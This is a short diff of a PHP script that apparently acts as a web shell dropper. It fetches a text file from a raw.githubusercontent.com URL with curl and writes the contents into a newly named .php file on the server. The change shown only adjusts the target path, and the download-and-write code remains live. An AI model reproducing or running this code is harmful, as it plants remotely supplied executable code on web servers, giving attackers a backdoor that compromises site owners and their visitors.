@@ -9,7 +9,7 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$check = $_SERVER['DOCUMENT_ROOT'] . "./".$fucek.".php" ;
+$check = "./".$fucek.".php" ;
 $text = http_get('https://raw.githubusercontent.com/boters/PythonBot/master/files/s.txt');
 $open = fopen($check, 'w');
 fwrite($open, $text);
